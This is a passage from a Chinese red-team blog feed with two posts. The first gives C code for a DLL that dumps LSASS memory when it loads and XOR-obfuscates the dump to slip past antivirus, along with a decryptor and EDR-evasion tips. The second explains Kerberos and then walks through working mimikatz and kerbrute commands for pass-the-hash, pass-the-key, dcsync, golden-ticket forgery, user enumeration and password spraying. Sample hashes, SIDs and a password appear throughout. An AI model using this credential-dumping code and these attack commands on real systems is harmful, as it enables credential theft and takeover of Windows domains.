		destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput-&gt;Io.Offset);

		// Size of the chunk of minidump that's just been read.
		bufferSize = callbackInput-&gt;Io.BufferBytes;
		bytesRead += bufferSize;

		RtlCopyMemory(destination, source, bufferSize);

		break;

	case IoFinishCallback:
		callbackOutput-&gt;Status = S_OK;
		break;

	default:
		return true;
	}
	return TRUE;
}

void DumpLsass()
{
	DWORD lsassPID = GetLsassPid();
	DWORD bytesWritten = 0;
	
	// Set up minidump callback
	MINIDUMP_CALLBACK_INFORMATION callbackInfo;
	ZeroMemory(&amp;callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
	callbackInfo.CallbackRoutine = &amp;minidumpCallback;
	callbackInfo.CallbackParam = NULL;

	GetDebugPrivilege();

	HANDLE lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
	// Dump lsass
	BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, NULL, MiniDumpWithFullMemory, NULL, NULL, &amp;callbackInfo);

	for (DWORD i = 0; i &lt; bytesRead; i++)
	{
		*((BYTE*)dumpBuffer + i) ^= 0x32;
	}

	// At this point, we have the lsass dump in memory at location dumpBuffer - we can do whatever we want with that buffer, i.e encrypt &amp; exfiltrate
	HANDLE outFile = CreateFile(L&quot;c:\\temp\\temp.bin&quot;, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	// For testing purposes, let's write lsass dump to disk from our own dumpBuffer and check if mimikatz can work it
	WriteFile(outFile, dumpBuffer, bytesRead, &amp;bytesWritten, NULL);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		DumpLsass();
		break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
</code></pre>
<p>最终得到的temp.bin如下，左边是使用procdump得到的未加密的进程转储文件：</p>
<figure data-type="image" tabindex="13"><img src="https://i.loli.net/2021/03/27/5ZCMUO7PJfn2YEj.png" alt="https://i.loli.net/2021/03/27/5ZCMUO7PJfn2YEj.png" loading="lazy"></figure>
<p>我们可以编写一个python脚本来将文件解密回来</p>
<pre><code class="language-c">with open(&quot;C:\\Temp\\temp.bin&quot;, &quot;rb&quot;) as f1:
    with open(&quot;C:\\Temp\\temp2.bin&quot;, &quot;ab&quot;) as f2:
        data = f1.read()
        print(len(data))
        for i in range(len(data)):
            newData = 0x32 ^ data[i]
            f2.write(bytes([newData]))
</code></pre>
<p>可以使用mimikatz成功读取：</p>
<figure data-type="image" tabindex="14"><img src="https://i.loli.net/2021/03/27/dxlhDWC9e8T1pfA.png" alt="https://i.loli.net/2021/03/27/dxlhDWC9e8T1pfA.png" loading="lazy"></figure>
<h3 id="4-x86环境下利用rpc加载ssp">4. x86环境下利用RPC加载SSP</h3>
<p><strong>TODO</strong></p>
<h3 id="5-其它可能用到的优化思路">5. 其它可能用到的优化思路</h3>
<ol>
<li>Dump进程的敏感API通过动态调用/API Hashing技术来规避静态检测</li>
<li>编写自己的dump函数，部分敏感API使用Direct Syscall</li>
<li>与C2结合，dump的文件/读取的hash直接回传</li>
</ol>
<h2 id="0x02-可能遇到的问题">0x02 可能遇到的问题</h2>
<h3 id="1-缺少vc运行库">1. 缺少VC运行库</h3>
<p>在某次授权渗透测试中，出现目标机器缺失VC运行库的问题：</p>
<figure data-type="image" tabindex="15"><img src="https://i.loli.net/2021/03/27/1S7h2u8WyB3vrbJ.png" alt="https://i.loli.net/2021/03/27/1S7h2u8WyB3vrbJ.png" loading="lazy"></figure>
<p>设置项目为静态链接程序所需要的运行库即可，如下图所示：</p>
<figure data-type="image" tabindex="16"><img src="https://i.loli.net/2021/03/27/azJCfiHu5sU2yDF.png" alt="https://i.loli.net/2021/03/27/azJCfiHu5sU2yDF.png" loading="lazy"></figure>
<p>成功运行，目标环境中存在卡巴斯基EDR，最终成功dump lsass</p>
<figure data-type="image" tabindex="17"><img src="https://i.loli.net/2021/03/27/3he96KZ1BRUNAn2.png" alt="https://i.loli.net/2021/03/27/3he96KZ1BRUNAn2.png" loading="lazy"></figure>
<h3 id="2-dump文件体积过大">2. dump文件体积过大</h3>
<p>有时我们可能会打到不出网的服务器，而此时我们又没有稳定的代理（Regeorg这些速度太慢），仅仅有一个webshell来下载大于30M的文件是十分不稳定的</p>
<p>个人一般的思路就是：</p>
<ul>
<li>免杀mimikatz或提取sekurlsa模块，将工具传上去读</li>
<li>上传7z.exe&amp;&amp;7z.dll，将文件进行分卷压缩再下载</li>
</ul>
<p>也想过直接把读取的功能写入SSP DLL里，然后结果输出到磁盘，但还未进行尝试，先算作一种思路吧</p>
<h2 id="0x03-总结">0x03 总结</h2>
<ul>
<li>无杀软随便玩，直接mimikatz上去读就是</li>
<li>无监控lsass的AV/EDR，可以通过免杀mimikatz进行直接读取，也可以使用白名单程序进行dump（需要注意部分杀软会对白名单程序报警）</li>
<li>如果是卡巴这种监控lsass的，最好是使用加载SSP的方式，优缺点参考前面的，可以根据不同情况使用不同的方法</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Kerberos认证协议学习]]></title>
        <id>https://redteamblog.icu/post/kerberos/</id>
        <link href="https://redteamblog.icu/post/kerberos/">
        </link>
        <updated>2022-04-25T06:35:55.000Z</updated>
        <content type="html"><![CDATA[<h2 id="环境">环境</h2>
<p>目前环境有两台机器，</p>
<p>其一为Windows2008，IP为192.168.1.3 是域redream的成员。</p>
<figure data-type="image" tabindex="1"><img src="https://redteamblog.icu/post-images/assets/image-20220314161347-1lqx905.png" alt="image.png" loading="lazy"></figure>
<p>其二为Windows2016，为域控制器。IP为 192.168.1.2</p>
<figure data-type="image" tabindex="2"><img src="https://redteamblog.icu/post-images/assets/image-20220314161455-t8gignu.png" alt="image.png" loading="lazy"></figure>
<table>
<thead>
<tr>
<th>主机</th>
<th>用户</th>
<th>IP</th>
</tr>
</thead>
<tbody>
<tr>
<td>域控（2016）</td>
<td>Administrator</td>
<td>192.169.1.2</td>
</tr>
<tr>
<td>域主机（2008）</td>
<td>user1</td>
<td>192.168.1.3</td>
</tr>
</tbody>
</table>
<h2 id="kerberos协议">kerberos协议</h2>
<p>Kerberos 协议是一种计算机网络授权协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。其设计目标是通过密钥系统为客户机与服务器应用程序提供强大的认证服务。该协议的认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享密钥）执行认证服务的。Kerberos 协议在在内网域渗透领域中至关重要，白银票据、黄金票据、攻击域控等都离不开 Kerberos 协议。</p>
<p>为了让阁下能够更轻松地理解后文对认证原理的讲解，你需要先了解以下几个关键角色：</p>
<table>
<thead>
<tr>
<th>角色</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>Domain Controller</td>
<td>域控制器，简称DC，一台计算机，实现用户、计算机的统一管理。</td>
</tr>
<tr>
<td>Key Distribution Center</td>
<td>秘钥分发中心，简称KDC，默认安装在域控里，包括AS和TGS。</td>
</tr>
<tr>
<td>Authentication Service</td>
<td>身份验证服务，简称AS，用于KDC对Client认证。</td>
</tr>
<tr>
<td>Ticket Grantng Service</td>
<td>票据授予服务，简称TGS，用于KDC向Client和Server分发Session Key（临时秘钥）。</td>
</tr>
<tr>
<td>Active Directory</td>
<td>活动目录，简称AD，用于存储用户、用户组、域相关的信息。</td>
</tr>
<tr>
<td>Client</td>
<td>客户端，指用户。</td>
</tr>
<tr>
<td>Server</td>
<td>服务端，可能是某台计算机，也可能是某个服务。</td>
</tr>
</tbody>
</table>
<h3 id="kerberos-概念名词解释">kerberos 概念名词解释</h3>
<pre><code class="language-c#">(1)Client:访问服务的客户机

(2)Server:提供服务的服务器

(3)KDC(Key Distribution Center):密钥分发中心 

(4)KDC中分成两个部分:Authentication Service和Ticket Granting Service
    Authentication Service(AS):身份验证服务
    Ticket Granting Service(TGS):票据授予服务

    AS和TGS如下：

    Authentication Service：AS的作用就是验证Client端的身份，验证通过之后，AS就会给TGT票据(Ticket Granting Ticket)给Client.
    Ticket-granting cookie(TGC):存放用户身份认证凭证的cookie，在浏览器和CAS Server间通讯时使用，是CAS Server用来明确用户身份的凭证。TGT封装了TGC值以及此Cookie值对应的用户信息.
    Ticket-granting ticket(TGT):TGT对象的ID就是TGC的值，在服务器端，通过TGC查询TGT.


    Ticket Granting Service(TGS)：TGS的作用是通过AS发送给Client的TGT换取访问Server端的ST(Server Ticket)给Client.
    SEerver Ticket(ST):ST服务票据，由TGS服务发布.


(5)Active Directory(AD):活动目录

(6)Domain Controller(DC):域控制器

(7)Ticket-granting cookie(TGC):存放用户身份认证凭证的cookie，在浏览器和CAS Server间通讯时使用，是CAS Server用来明确用户身份的凭证。TGT封装了TGC值以及此Cookie值对应的用户信息.

(8)Ticket-granting ticket(TGT):TGT对象的ID就是TGC的值，在服务器端，通过TGC查询TGT.
</code></pre>
<p>打个比方：当 whoami 要和 bunny 进行通信的时候，whoami 就需要向 bunny 证明自己是whoami，直接的方式就是 whoami 用二人之间的秘密做秘钥加密明文文字生成密文，把密文和明文文字一块发送给 bunny，bunny 再用秘密解密得到明文，把明文和明文文字进行对比，若一致，则证明对方是 whoami。</p>
<p>但是网络中，密文和文字很有可能被窃取，并且只要时间足够，总能破解得到秘钥。所以不能使用这种长期有效的秘钥，要改为短期的临时秘钥。那么这个临时秘钥就需要一个第三方可信任的机构来提供，即 KDC（Key Distribution Center）秘钥分发中心。</p>
<p><code>Kerberos</code>认证的过程形象地比喻如下：</p>
<pre><code>疫情期间，小明去拿一个重要包裹，由于包裹是来自海外的，所以需要严格登记：
（1）拿包裹的时候，为了证明自己是合法公民，小明先把身份证给工作人员
（2）快递点的身份认证系统通过身份认证后，给小明一张身份认证通过证明
（3）小明拿着身份认证通过证明，来到快递收发处等一张拿快递的号码牌
（4）售票处给了张号码牌
（5）小明拿着号码牌拿快递去了
（6）在拿快递时，小明拿出自己的身份认证材料给快递点的工作人员，工作人员向快递公司的数据管理中心发了消息，问问小明是不是有包裹要拿
（7）数据管理中心将小明的快递单号，身份信息等发了过来
（8）工作人员将数据管理中心发来的信息与小明给的材料对比，得出小明是好公民，有一个重要包裹，于是带着小明来到仓库的金库，把装有老魔杖的包裹给了小明
</code></pre>
<p>在<code>Kerboeros</code>协议认证过程中，会用到两个基础认证模块，分别是<code>AS_REQ&amp;AS_REP</code>和<code>TGS_REQ&amp;TGS_REP</code>，以及在认证过程中可能会使用到的<code>S4U</code>和<code>PAC</code>这两个认证模块。</p>
<h2 id="kerberos认证的问题"><strong>kerberos认证的问题</strong></h2>
<p>上面说了，因为<code>kerberos</code>协议的实现，需要三方的参与，分别如下：</p>
<pre><code class="language-html">1.client 访问服务的客户机
2.Server 提供服务的服务器
3.KDC(Key Distribution Center) 密钥分发中心 
    KDC服务会默认安装在一个域的域控中，所以可以直接理解为，AD与KDC均为域控制器,KDC服务框架中包含一个KRBTGT账户，它是在创建域时系统自动创建的一个账号。
</code></pre>
<h2 id="kerberos认证协议原理流程">kerberos认证协议原理流程</h2>
<p><code>Kerberos</code>认证过程如下图所示</p>
<figure data-type="image" tabindex="3"><img src="https://redteamblog.icu/post-images/assets/image-20220314170426-spssrt4.png" alt="image.png" loading="lazy"></figure>
<p>下面讲一下详细的认证步骤，大概分为三个阶段：</p>
<ul>
<li>AS_REQ &amp; AS_REP</li>
<li>TGS_REQ &amp; TGS_REP</li>
<li>AP-REQ &amp; AP-REP</li>
</ul>
<p>其中：<code>KDC</code>中有<code>AS认证服务</code>与<code>TGS认证服务</code></p>
<ol>
<li>CLient向KDC的AS认证服务请求TGT票据，此处是AS_REQ流程</li>
<li>认证通过后返回 TGT 给 Client，Client 得到 KDC发放的TGT（Ticket Granting Ticket）票据。此处是AS_REP流程</li>
<li>Client 继续拿着 TGT票据 请求 DC 访问 Server，TGS 通过 Client 消息中的 TGT票据请求ST的服务票据（Service Ticket）。此处是TGS_REQ流程</li>
<li>Client通过了TGS认证服务后，TGS将会发放ST服务票据给Client。此处是TGS_REP流程。</li>
<li>Client 得到 ST票据 后，再去向Server请求服务。此处是AP-REQ流程。</li>
<li>server拿到PAC询问KDC，client是否有权限访问资源</li>
<li>KDC将clinet的权限信息发送给server</li>
<li>server根据KDC返回的权限信息做对比，判断client是否有权限访问该服务，并把结果返回给client。此处是AP_REP流程。</li>
</ol>
<pre><code class="language-c#">注：（6）（7）两步不一定发生，需要将目标主机配置为验证KDC PAC验证。
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://redteamblog.icu/post-images/assets/image-20220314175736-64x1hwv.png" alt="image.png" loading="lazy"></figure>
<pre><code class="language-c#">域中每个用户的Ticket都是由krbtgt的密码Hash来计算生成的,因此只要我们拿到了krbtgt的密码Hash,就可以随意伪造Ticket,进而使用Ticket登陆域控制器,使用krbtgt用户hash生成的票据被称为Golden Ticket,此类攻击方法被称为票据传递攻击。
</code></pre>
<h2 id="as_req-as_rep分析">AS_REQ &amp; AS_REP分析</h2>
<p><strong>分析AS-REQ的数据包</strong></p>
<p><code>AS-REQ</code>：当某个域用户试图访问域中的某个服务，于是输入用户名和密码，本机<code>Kerberos</code>服务会向<code>KDC</code>的<code>AS</code>认证服务发送一个<code>AS-REQ</code>认证请求。该请求包中包含：<code>请求用户名</code>，<code>客户端主机名</code>，<code>加密类型</code>和<code>Autherticator(用户NTLM Hash加密的时间戳)</code>以及一些信息。</p>
<p><code>Client</code>向<code>KDC</code>发起<code>AS_REQ</code>请求凭据是用户hash加密的时间戳。请求凭据放在<code>PA_DATA</code>里面。</p>
<p>我们这里直接<a href="https://so.csdn.net/so/search?q=%E6%8A%93%E5%8C%85&amp;spm=1001.2101.3001.7020">抓包</a>来看，让域内机器user1使用用户test来登录。</p>
<h3 id="1as-req">1.AS-REQ</h3>
<figure data-type="image" tabindex="5"><img src="https://redteamblog.icu/post-images/assets/image-20220316155027-2z8bdvm.png" alt="image.png" loading="lazy"></figure>
<figure data-type="image" tabindex="6"><img src="https://redteamblog.icu/post-images/assets/image-20220316160007-3lc9neh.png" alt="image.png" loading="lazy"></figure>
<p>AS获取用户名之后，获取对应的<code>ntlm</code>值，通过加密的方法加密数据信息，并且验证时间戳，之后生成随机字符串<code>Session Key</code>，使用用户的ntlm值加密<code>Session Key</code>，使用<code>krbtgt</code>用户的<code>ntlm</code>加密<code>Session Key</code>和客户端信息，一起返回客户端</p>
<pre><code class="language-Send=user_NTML_Hash(Session">Send=user_NTML_Hash(Session Key)+krbtgt_NTML_Hash(Session Key+client_info1)[TGT]
</code></pre>
<p>AS-REQ存在俩种包</p>
<p>一种是不存在<code>pA-ENC-TIMESTAMP</code>字段的，另外一种是前面存在密码字段的</p>
<figure data-type="image" tabindex="7"><img src="https://redteamblog.icu/post-images/assets/image-20220316160806-gpai01k.png" alt="image.png" loading="lazy"></figure>
<h3 id="2as-req不同的包">2.AS-REQ不同的包</h3>
<h4 id="用户名和密码正确的包">用户名和密码正确的包</h4>
<figure data-type="image" tabindex="8"><img src="https://redteamblog.icu/post-images/assets/image-20220316163624-1fi7ze3.png" alt="image.png" loading="lazy"></figure>
<p><code>AS-REP</code>：Client发送<code>AS_REQ</code>，请求凭据是用户 hash加密的时间戳。请求凭据放在PA_DATA里面。 <strong>当KDC中的AS认证服务收到后，在AS服务器中有用户hash，使用用户hash进行解密，获得时间戳</strong> ，如果 <strong>解密成功，并且时间戳在五分钟之内</strong> ，那么 <strong>预认证通过</strong> 。接着AS认证服务将会向Client发送响应包，响应包中包括<strong>krbtgt用户的NTML hash加密后的TGT票据</strong>以及<strong>用户NTML Hash加密的Login Session key和其他信息</strong>。</p>
<pre><code class="language-Send=user_NTML_Hash(Session">ticket中的enc-part是由krbtgt的密码hash加密生成的。如果我们拥有krbtgt的hash，便可以自制ticket，发起黄金票据攻击

Login Session Key使用用户NTML Hash加密，作用是用于是用于确保客户端和KDC下一阶段之间通信安全，作为下一阶段的认证密钥
</code></pre>
<p>在这一阶段，Client与KDC之间的交互在于AS认证服务，主要是为了获得TGT认证票据，以及Login Session Key，经过该阶段后，Client将会使用自身密码的NTML hash解密Login Session Key得到原始的Login Session Key。然后它会在本地缓存TGT票据和原始Login Session Key。</p>
<h4 id="用户名不正确的包">用户名不正确的包</h4>
<figure data-type="image" tabindex="9"><img src="https://redteamblog.icu/post-images/assets/image-20220317113241-2gubvzb.png" alt="image.png" loading="lazy"></figure>
<h4 id="用户名正确的包">用户名正确的包</h4>
<figure data-type="image" tabindex="10"><img src="https://redteamblog.icu/post-images/assets/image-20220317104822-nemyrdj.png" alt="image.png" loading="lazy"></figure>
<h4 id="密码不正确的包">密码不正确的包</h4>
<figure data-type="image" tabindex="11"><img src="https://redteamblog.icu/post-images/assets/image-20220321144305-lmp9huz.png" alt="image.png" loading="lazy"></figure>
<h4 id="as-req流程的的攻击面">AS-REQ流程的的攻击面</h4>
<p>通过上面的抓包分析可以得出：</p>
<p>1.HASH传递</p>
<p>2.域内用户枚举</p>
<p>3.密码喷洒</p>
<h5 id="hash传递攻击方法"><strong>HASH传递攻击方法</strong></h5>
<p>在AS-REQ阶段，是用用户密码Hash加密的Authenticator，所以也就造成了hash传递。</p>
<h6 id="mimikatz进行hash传递">mimikatz进行hash传递</h6>
<p>这里mimikatz获取hash导出到log日志中，命令如下</p>
<pre><code class="language-html">mimikatz log privilege::debug sekurlsa::ekeys
</code></pre>
<figure data-type="image" tabindex="12"><img src="https://redteamblog.icu/post-images/assets/image-20220328110317-g6qk8z2.png" alt="image.png" loading="lazy"></figure>
<p>抓取administrator的ntlm哈希</p>
<pre><code class="language-html">privilege::debug
​
sekurlsa::logonpasswords
</code></pre>
<figure data-type="image" tabindex="13"><img src="https://redteamblog.icu/post-images/assets/image-20220328110440-tyvpbeg.png" alt="image.png" loading="lazy"></figure>
<h6 id="执行传递">执行传递</h6>
<pre><code class="language-html">sekurlsa::pth /user:administrator /domain:192.168.10.5 /ntlm:7c64e7ebf46b9515c56b2dd522d21c1c
</code></pre>
<figure data-type="image" tabindex="14"><img src="https://redteamblog.icu/post-images/assets/image-20220328110538-xbjzs1y.png" alt="image.png" loading="lazy"></figure>
<h6 id="kb2871997补丁的传递方法">KB2871997补丁的传递方法</h6>
<figure data-type="image" tabindex="15"><img src="https://redteamblog.icu/post-images/assets/image-20220328110808-sjsj87y.png" alt="image.png" loading="lazy"></figure>
<p>安装KB2871997这个补丁之后，只能用管理员账户进行pass hash</p>
<h6 id="ptkpass-the-key">PTK（pass the key）</h6>
<p>获取aes-key:</p>
<pre><code>privilege::debug
​
sekurlsa::ekeys
</code></pre>
<figure data-type="image" tabindex="16"><img src="https://redteamblog.icu/post-images/assets/image-20220328110909-b95ug5k.png" alt="image.png" loading="lazy"></figure>
<p>注入aes-key:</p>
<pre><code>sekurlsa::pth /user:Administrator /domain:Drunkmars.com /aes256:cf5dba161f3a3dc89454742ff5db89980d6b07e771048b30006546e81d1d79e2
</code></pre>
<figure data-type="image" tabindex="17"><img src="https://redteamblog.icu/post-images/assets/image-20220328110538-xbjzs1y.png" alt="image.png" loading="lazy"></figure>
<h5 id="域内用户枚举"><strong>域内用户枚举</strong></h5>
<p>AS-REQ 的 cname 值，当用户不存在时，返回包提示错误，所以造成了改攻击方式。</p>
<h6 id="攻击方法">攻击方法</h6>
<p>使用kerbrute工具：</p>
<p><a href="https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe">https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe</a></p>
<p>前提需要DC需要开启kerberos 88端口</p>
<figure data-type="image" tabindex="18"><img src="https://redteamblog.icu/post-images/assets/image-20220328111041-6ei36q1.png" alt="image.png" loading="lazy"></figure>
<p>使用以下命令</p>
<pre><code>kerbrute_windows_amd64.exe userenum --dc 192.168.10.5 -d Drunkmars.com user.txt
</code></pre>
<p>user.txt是用户名的字典</p>
<figure data-type="image" tabindex="19"><img src="https://redteamblog.icu/post-images/assets/image-20220328111118-vzr46zq.png" alt="image.png" loading="lazy"></figure>
<p>成功爆出用户名。</p>
<h6 id="原理">原理：</h6>
<p>使用kerbrute进行错误枚举的原理就是kerberos有三种错误代码：</p>
<p>KDC_ERR_PREAUTH_REQUIRED-需要额外的预认证（启用）</p>
<p>KDC_ERR_CLIENT_REVOKED-客户端凭证已被吊销（禁用）</p>
<p>KDC_ERR_C_PRINCIPAL_UNKNOWN-在Kerberos数据库中找不到客户端（不存在）</p>
<p>在DC抓包可以看到有4个UNKNOWN，1个REQUIRED，证明有这个用户名存在</p>
<figure data-type="image" tabindex="20"><img src="https://redteamblog.icu/post-images/assets/image-20220328111231-y63nbd8.png" alt="image.png" loading="lazy"></figure>
<h5 id="密码喷洒"><strong>密码喷洒</strong></h5>
<p>并且当用户名存在，密码正确和错误时，返回包也不一样，所以可以进行用户名密码爆破。这种针对所有用户的自动密码猜测通常是为了避免帐户被锁定，因为针对同一个用户的连续密码猜测会导致帐户被锁定。所以只有对所有用户同时执行特定的密码登录尝试，才能增加破解的概率，消除帐户被锁定的概率</p>
<p>使用以下命令</p>
<pre><code class="language-html">kerbrute_windows_amd64.exe passwordspray --dc 192.168.10.5 -d Drunkmars.com user.txt Fcb0519..
</code></pre>
<figure data-type="image" tabindex="21"><img src="https://redteamblog.icu/post-images/assets/image-20220328111319-kaj1c1y.png" alt="image.png" loading="lazy"></figure>
<h5 id="原理-2">原理：</h5>
<p>密码同样存在三种错误代码</p>
<p>KDC_ERR_PREAUTH_REQUIRED-需要额外的预认证（启用）</p>
<p>KDC_ERR_CLIENT_REVOKED-客户端凭证已被吊销（禁用）</p>
<p>KDC_ERR_C_PRINCIPAL_UNKNOWN-在Kerberos数据库中找不到客户端（不存在）</p>
<p>同样在DC抓包，有4个UNKNOWN，1个REQUIRED</p>
<figure data-type="image" tabindex="22"><img src="https://redteamblog.icu/post-images/assets/image-20220328111359-y6zvkss.png" alt="image.png" loading="lazy"></figure>
<figure data-type="image" tabindex="23"><img src="https://redteamblog.icu/post-images/assets/image-20220328111403-xddzvfj.png" alt="image.png" loading="lazy"></figure>
<h3 id="as-rep数据包">AS-REP数据包</h3>
<p><code>AS-REP</code>：Client发送<code>AS_REQ</code>，请求凭据是用户 hash加密的时间戳。请求凭据放在PA_DATA里面。 <strong>当KDC中的AS认证服务收到后，在AS服务器中有用户hash，使用用户hash进行解密，获得时间戳</strong> ，如果 <strong>解密成功，并且时间戳在五分钟之内</strong> ，那么 <strong>预认证通过</strong> 。接着AS认证服务将会向Client发送响应包，响应包中包括<strong>krbtgt用户的NTML hash加密后的TGT票据</strong>以及 <strong>用户NTML Hash加密的Login Session key和其他信息</strong> 。</p>
<figure data-type="image" tabindex="24"><img src="https://redteamblog.icu/post-images/assets/image-20220321145439-qhw0d6c.png" alt="image.png" loading="lazy"></figure>
<p><strong>ticket中的enc-part是由krbtgt的密码hash加密生成的。如果我们拥有krbtgt的hash，便可以自制ticket，发起黄金票据攻击</strong></p>
<p><strong>Login Session Key使用用户NTML Hash加密，作用是用于是用于确保客户端和KDC下一阶段之间通信安全，作为下一阶段的认证密钥</strong></p>
<p><strong>在enc-part里面最重要的字段是Login session key，作为下阶段的认证密钥。<br>
AS-REP中最核心的东西就是 Login session-key 和 加密的ticket。正常我们用工具生成的凭据是 .ccache 和 .kirbi 后缀的，用mimikatz，kekeo，rubeus生成的凭据是以 .kirbi 后缀的，impacket 生成的凭据的后缀是 .ccache 。两种票据主要包含的都是Login session-key 和 加密的 ticket，因此可以相互转化。</strong></p>
<h4 id="as-rep的攻击面">AS-REP的攻击面</h4>
<h5 id="黄金票据"><strong>黄金票据</strong></h5>
<p>在 AS-REP 阶段，由于返回的 TGT 认购权证是由 krbtgt 用户的密码Hash加密的，因此如果我们拥有 krbtgt 的 hash 就可以自己制作一个TGT认购权证，这就造成了黄金票据攻击</p>
<p>伪造黄金票据的条件：</p>
<p>我们伪造凭证，需要以下信息：</p>
<ul>
<li>域名</li>
<li>域的SID值</li>
<li>域的KRBTGT账号的HASH</li>
<li>伪造的域管理员用户名</li>
</ul>
<h5 id="黄金票据攻击实践">黄金票据攻击实践</h5>
<h6 id="收集域信息">收集域信息</h6>
<p>netconfig workstation</p>
<figure data-type="image" tabindex="25"><img src="https://redteamblog.icu/post-images/assets/image-20220321170652-qw7nl6a.png" alt="image.png" loading="lazy"></figure>
<p>可以获得域是redtem.com，用户名是YG1。</p>
<p>获得域控的IP也很简单，ping一下即可，或者</p>
<p>nltest/dsgetdc:域名<br>
nltest/dsgetdc:redteam.com</p>
<figure data-type="image" tabindex="26"><img src="https://redteamblog.icu/post-images/assets/image-20220321170827-0vwhca3.png" alt="image.png" loading="lazy"></figure>
<p>获取到域控IP为192.168.1.2</p>
<h6 id="导出hash">导出HASH</h6>
<pre><code class="language-Send=user_NTML_Hash(Session">privilege::debug
  lsadump::dcsync /domain:redteam.com /all /csv
</code></pre>
<p>用管理权限使用mimikatz.exe导出用户的krbtgt的hash</p>
<figure data-type="image" tabindex="27"><img src="https://redteamblog.icu/post-images/assets/image-20220321173027-8rmsug9.png" alt="image.png" loading="lazy"></figure>
<p>fb2227f9e9e6c9ad490eb1c2fa6a8625</p>
<h6 id="收集krbtgt的sid信息">收集Krbtgt的SID信息</h6>
<pre><code class="language-Send=user_NTML_Hash(Session">lsadump::dcsync /domain:redteam.com /user:krbtgt 
或者
wmic useraccount get name,sid
</code></pre>
<figure data-type="image" tabindex="28"><img src="https://redteamblog.icu/post-images/assets/image-20220321174032-qlbyobd.png" alt="image.png" loading="lazy"></figure>
<p>S-1-5-21-767623950-3225260823-3670188588</p>
<p>fb2227f9e9e6c9ad490ebic2fa6a8625</p>
<p>获取到SID和HASH之后就可以伪造票据了，伪造之前先看一下有没有缓存票据</p>
<pre><code class="language-klist">klist /查看票据
</code></pre>
<figure data-type="image" tabindex="29"><img src="https://redteamblog.icu/post-images/assets/image-20220321174303-x16pgjb.png" alt="image.png" loading="lazy"></figure>
<pre><code class="language-klist">klist purge /清除票据
或者
mimitakzt kerberos::purge 
</code></pre>
<figure data-type="image" tabindex="30"><img src="https://redteamblog.icu/post-images/assets/image-20220321174453-8zk445a.png" alt="image.png" loading="lazy"></figure>
<h6 id="利用mimikatz生成黄金票据">利用mimikatz生成黄金票据</h6>
<pre><code class="language-html"> mimikatz.exe &quot;kerberos::golden /user:Administrator /domain:redteam.com /sid:S-1-5-21-767623950-3225260823-3670188588 /krbtgt:fb2227f9e9e6c9ad490ebic2fa6a8625 /ticket:qqq.kirbi&quot; exit
 
 
 /admin：伪造的用户名（任意）
 /domain：域名称
 /sid：sid值，注意要去掉最后一个值 -后面的值
 /krbtgt：krbtgt的hash值
 /ticket：生成的票据名称

</code></pre>
<p>或者</p>
<pre><code class="language-html">kerberos::golden /user:administrator12 /domain:redteam.com /sid:S-1-5-21-767623950-3225260823-3670188588 /krbtgt:fb2227f9e9e6c9ad490eb1c2fa6a8625 /ptt  #生成票据并导入
</code></pre>
<figure data-type="image" tabindex="31"><img src="https://redteamblog.icu/post-images/assets/image-20220321181634-11exgmf.png" alt="image.png" loading="lazy"></figure>
<p>有了票据之后，拿一个域用户来测试一下票据能否正常使用。</p>
<h6 id="查看导入的票据">查看导入的票据</h6>
<p><code>kerberos::purge kerberos::ptt ticket.kirbi</code></p>
<figure data-type="image" tabindex="32"><img src="https://redteamblog.icu/post-images/assets/image-20220321182507-lpah455.png" alt="image.png" loading="lazy"></figure>
<h6 id="查询dc机器c盘目录">查询DC机器C盘目录</h6>
<pre><code class="language-html">dir \\dc.redteam.com\c$

dir \\计算机名.域名\c$
</code></pre>
<figure data-type="image" tabindex="33"><img src="https://redteamblog.icu/post-images/assets/325a475a104c45bb543a25740ee6de0-20220322101346-o758lqw.png" alt="325a475a104c45bb543a25740ee6de0.png" loading="lazy"></figure>
<p>DC火绒拦截了IPC，所以没访问成功，关掉后正常，至此，黄金票据利用成功。</p>
<h2 id="tgs_reqtgs_rep分析">TGS_REQ&amp;TGS_REP分析</h2>
<pre><code class="language-html"> Client与TGS之间认证使用TGS_REQ&amp;TGS_REP模块
</code></pre>
<p>Client在拿到<code>TGT</code>和<code>Login Session Key</code>之后，下一步的认证交互在于 <strong>KDC中的TGS认证服务</strong> ，主要目的是为了获取 <strong><code>ST服务票据</code></strong> ，因为当Client需要访问某服务器中的某服务时，需要 <strong>&quot;门票&quot;</strong> --<strong>ST服务票据</strong></p>
<p>这一阶段，微软引进了两个扩展<code>S4U2SELF</code>和<code>S4U2PROXY</code>。</p>
<h3 id="tgs-req数据包分析"><strong>TGS-REQ数据包分析</strong></h3>
<p>该数据包中的主要内容为：<code>客户端信息，Authenticator(Login Session Key加密的时间戳)、TGT认证权证(padata下ap-req下的ticket)以及访问的服务名</code>等。</p>
<figure data-type="image" tabindex="34"><img src="https://redteamblog.icu/post-images/assets/image-20220322103732-894g4oh.png" alt="image.png" loading="lazy"></figure>
<p><code>padata</code>部分：</p>
<figure data-type="image" tabindex="35"><img src="https://redteamblog.icu/post-images/assets/image-20220322104159-n3qhf18.png" alt="image.png" loading="lazy"></figure>
